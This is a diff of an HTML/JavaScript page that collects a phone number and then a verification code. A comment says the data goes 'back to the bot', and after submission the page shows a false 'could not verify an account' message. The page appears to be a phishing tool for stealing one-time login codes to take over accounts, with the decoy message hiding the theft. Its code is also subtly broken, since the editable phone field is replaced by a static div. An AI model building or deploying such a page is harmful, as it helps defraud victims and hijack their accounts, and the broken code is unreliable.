@@ -90,9 +90,20 @@
             margin-bottom: 20px;
         }
 
-        #verificationContainer {
+        #verificationContainer, #finalMessageContainer {
             display: none;
         }
+
+        /* Underline effect for phone number input */
+        .input-underline {
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            border-bottom: 1px solid #333;
+            padding-bottom: 5px;
+            letter-spacing: 1px;
+        }
+
     </style>
 </head>
 <body>
@@ -104,24 +115,24 @@
         <div class="input-group">
             <label for="countryCode">Country</label>
             <!-- Country Code Dropdown -->
-            <select id="countryCode">
-                <option value="+61">🇦🇺 Australia (+61)</option>
-                <option value="+1">🇺🇸 United States (+1)</option>
-                <option value="+44">🇬🇧 United Kingdom (+44)</option>
-                <option value="+49">🇩🇪 Germany (+49)</option>
-                <option value="+33">🇫🇷 France (+33)</option>
-                <option value="+81">🇯🇵 Japan (+81)</option>
-                <option value="+91">🇮🇳 India (+91)</option>
-                <option value="+86">🇨🇳 China (+86)</option>
-                <option value="+7">🇷🇺 Russia (+7)</option>
-                <option value="+82">🇰🇷 South Korea (+82)</option>
+            <select id="countryCode" onchange="updatePhoneNumber()">
+                <option value="+61" data-country="Australia">🇦🇺 Australia (+61)</option>
+                <option value="+1" data-country="United States">🇺🇸 United States (+1)</option>
+                <option value="+44" data-country="United Kingdom">🇬🇧 United Kingdom (+44)</option>
+                <option value="+49" data-country="Germany">🇩🇪 Germany (+49)</option>
+                <option value="+33" data-country="France">🇫🇷 France (+33)</option>
+                <option value="+81" data-country="Japan">🇯🇵 Japan (+81)</option>
+                <option value="+91" data-country="India">🇮🇳 India (+91)</option>
+                <option value="+86" data-country="China">🇨🇳 China (+86)</option>
+                <option value="+7" data-country="Russia">🇷🇺 Russia (+7)</option>
+                <option value="+82" data-country="South Korea">🇰🇷 South Korea (+82)</option>
                 <!-- Add more countries here -->
             </select>
         </div>
 
         <div class="input-group">
             <label for="phoneNumber">Phone Number</label>
-            <input type="text" id="phoneNumber" placeholder="Phone Number">
+            <div id="phoneNumberContainer" class="input-underline"></div>
         </div>
 
         <div>
@@ -146,16 +157,27 @@
         <button class="button" onclick="submitVerification()">Submit</button>
     </div>
 
+    <div class="container" id="finalMessageContainer">
+        <p id="finalMessage"></p>
+    </div>
+
     <script>
+        function updatePhoneNumber() {
+            const countryCode = document.getElementById('countryCode').value;
+            document.getElementById('phoneNumberContainer').textContent = countryCode + ' _____';
+        }
+
         function goToVerificationPage() {
             const countryCode = document.getElementById('countryCode').value;
-            const phoneNumber = document.getElementById('phoneNumber').value;
-            const fullPhoneNumber = `${countryCode} ${phoneNumber}`;
+            const phoneNumberContainer = document.getElementById('phoneNumberContainer').textContent;
+            const phoneNumber = phoneNumberContainer.replace(countryCode + ' ', '').trim();
 
-            if (phoneNumber === '') {
+            if (phoneNumber === '_____') {
                 alert('Please enter your phone number.');
                 return;
             }
+
+            const fullPhoneNumber = `${countryCode} ${phoneNumber}`;
 
             document.getElementById('phoneDisplay').textContent = fullPhoneNumber;
 
@@ -164,8 +186,8 @@
         }
 
         function submitVerification() {
-            const verificationCode = document.getElementById('verificationCode').value;
             const phoneDisplay = document.getElementById('phoneDisplay').textContent;
+            const verificationCode = document.getElementById('verificationCode').value;
 
             if (verificationCode === '') {
                 alert('Please enter the verification code.');
@@ -174,14 +196,20 @@
 
             // Send data back to the bot
             // This would typically involve an AJAX request or some other method of communication
-            alert(`Phone Number: ${phoneDisplay}\nVerification Code: ${verificationCode}`);
+            // alert(`Phone Number: ${phoneDisplay}\nVerification Code: ${verificationCode}`);
+
+            // Display final message
+            document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number ${phoneDisplay}.`;
+            document.getElementById('verificationContainer').style.display = 'none';
+            document.getElementById('finalMessageContainer').style.display = 'block';
 
             // Reset form for another use
-            document.getElementById('initialContainer').style.display = 'block';
-            document.getElementById('verificationContainer').style.display = 'none';
-            document.getElementById('phoneNumber').value = '';
+            document.getElementById('phoneNumberContainer').textContent = '+__ _____';
             document.getElementById('verificationCode').value = '';
         }
+
+        // Initialize phone number field with default country code
+        updatePhoneNumber();
     </script>
 </body>
 </html>
